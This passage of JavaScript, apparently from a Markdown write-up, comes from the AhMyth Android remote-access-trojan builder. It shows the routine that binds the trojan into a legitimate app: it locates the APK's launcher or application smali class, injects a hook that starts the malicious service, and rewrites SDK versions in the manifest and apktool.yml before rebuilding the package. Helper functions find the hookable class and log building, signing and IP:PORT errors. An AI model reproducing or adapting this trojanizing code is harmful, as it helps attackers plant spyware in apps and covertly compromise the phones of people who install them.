                        const startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
                        var hook = CONSTANTS.hookPoint;


                        delayedLog('[★] Hooking the Class File...\n');

                        var output = data.replace(hook, startService);
                        fs.writeFile(dir.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                            if (error) {
                                delayedLog('[x] Modifying the Hookable Main Class File Failed!\n', CONSTANTS.logStatus.FAIL);
                                return;
                            }


                            delayedLog('[★] Determining Target SDK Version...\n');
                            fs.readFile(dir.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
                                if (error) {

                                    delayedLog('[x] Reading the Manifest Target SDK Failed.');

                                    return;
                                }


                                delayedLog('[★] Modifying the Target SDK Version...\n');


                                var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                                var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                                var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                                var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/

                                var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"')
                                .replace(compSdkVerNameRegex, "$111" + '"')
                                .replace(platVerCoRegex, "$122" + '"')
                                .replace(platVerNameRegex, "$111" + '"');

                                fs.writeFile(dir.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                                    if (error) {

                                        delayedLog('[x] Modifying Manifest Target SDK Failed!\n', CONSTANTS.logStatus.FAIL);

                                        return;
                                    }

                                    fs.readFile(dir.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                        if (error) {

                                            delayedLog("[x] Reading the 'apktool.yml' Target SDK Failed!\n");

                                            return;
                                        }

                                        var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                        var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;

                                        var repYmlSdk = data.replace(minSdkRegex, "$119'")
                                        .replace(tarSdkRegex, "$122'");

                                        fs.writeFile(dir.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                            if (error) {

                                                delayedLog("[x] Modifying the 'apktool.yml' Target SDK Failed!\n");

                                                return;
                                            }
                                            $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);
                                        });
                                    });
                                });
                            });

                        });

                    });

                });

            });

        });
    });

};
```
## New Functions
```js
function delayedLog(msg, status) {
    let count = delayedLog.count = (delayedLog.count || 0) + 1;
    setTimeout(() => {
        $appCtrl.Log(msg, status);
    }, count * 0500);
};

function WriteErrorLog(errorMessage, errorType) {
    // Check if the log directory exists, if not then create it
    if (!fs.existsSync(logPath)) {
        fs.mkdirSync(logPath);
    }

    // Write the error to the appropriate log file based on the error type
    switch (errorType) {
        case 'Building':
            fs.appendFileSync(dir.join(logPath, 'Building.log'), errorMessage + '\n');
            break;
            
        case 'Signing':
            fs.appendFileSync(dir.join(logPath, 'Signing.log'), errorMessage + '\n');
            break;
            
        case 'Decompiling':
            fs.appendFileSync(dir.join(logPath, 'Decompiling.log'), errorMessage + '\n');
            break;
            
        case 'IP:PORT':
            fs.appendFileSync(dir.join(logPath, 'IP-PORT.log'), errorMessage + '\n');
            break;
            
        case 'Copying':
            fs.appendFileSync(dir.join(logPath, 'Copying.log'), errorMessage + '\n');
            break;
            
        default:
            // If the error type is not recognized, write it to a generic error log file
            fs.appendFileSync(dir.join(logPath, 'Error.log'), errorMessage + '\n');
            break;
    }
}

function GetLauncherActivity(manifest) {

    const application = manifest['manifest']['application'][0];

    let mainApplicationClassName = application && application['$'] && application['$']['android:name'];

    if (mainApplicationClassName && !mainApplicationClassName.startsWith('android.app')) {
        mainApplicationClassName = mainApplicationClassName.split('.').pop();
        if (mainApplicationClassName.startsWith('.')) {
            mainApplicationClassName = mainApplicationClassName.slice(1);
        }
        delayedLog('[¡] Scoped the Main App Class for Hooking...', CONSTANTS.logStatus.INFO);
        return mainApplicationClassName + '.smali';
    }

    const activity = application && application['activity'] && application['activity'].find((activity) => {
        const intentFilter = activity['intent-filter'];
        if (intentFilter) {
            return intentFilter.some((filter) =>
                filter['action'] &&
                filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
                filter['category'] &&
                filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
            );
        }
        return false;
    });

    if (activity) {
        let mainActivityClassName = activity['$'] && activity['$']['android:name'];
        if (!mainActivityClassName.startsWith('android.app')) {
            mainActivityClassName = mainActivityClassName.split('.').pop();
            if (mainActivityClassName.startsWith('.')) {
                mainActivityClassName = mainActivityClassName.slice(1);
            }
            delayedLog('[¡] Scoped the Main Launcher Activity Class for Hooking...', CONSTANTS.logStatus.INFO);
            return mainActivityClassName + '.smali';
        }
    }

    const activityAlias = application && application['activity-alias'] && application['activity-alias'].find((activityAlias) => {
        const intentFilter = activityAlias['intent-filter'];
        if (intentFilter) {
            return intentFilter.some((filter) =>
                filter['action'] &&
                filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
                filter['category'] &&
                filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
            );
        }
        return false;
    });

    if (activityAlias) {
        let targetActivityName = activityAlias['$'] && activityAlias['$']['android:targetActivity'];
        targetActivityName = targetActivityName.split('.').pop();
        if (targetActivityName.startsWith('.')) {
            targetActivityName = targetActivityName.slice(1);
        }
        delayedLog('[¡] Scoped the Main Launcher Activity Class in an Alias for Hooking...', CONSTANTS.logStatus.INFO);
        return targetActivityName + '.smali';
    }

    return -1;

}

function GetLauncherPath(launcherActivity, apkFolder, callback) {
    let found = false;
    let launcherPath = null;
    readdirp(apkFolder, {
        fileFilter: launcherActivity, alwaysStat: true
    })
    .on('data', (entry) => {
        found = true;
        var {
            path, stats: {}
        } = entry;
        var output = `${JSON.stringify(path)}`;
        launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\n$/, '');
    })
    .on('end',
        () => {
            if (!found) {
                callback('[x] Unable to Locate the Hookable Main Class File!');
                callback('[x] Please Use the "On Boot" Method!\n');
            } else {
                callback(null, launcherPath);
            }
        })
    .on('error',
        (err) => {
            callback(err);
        });
}
```
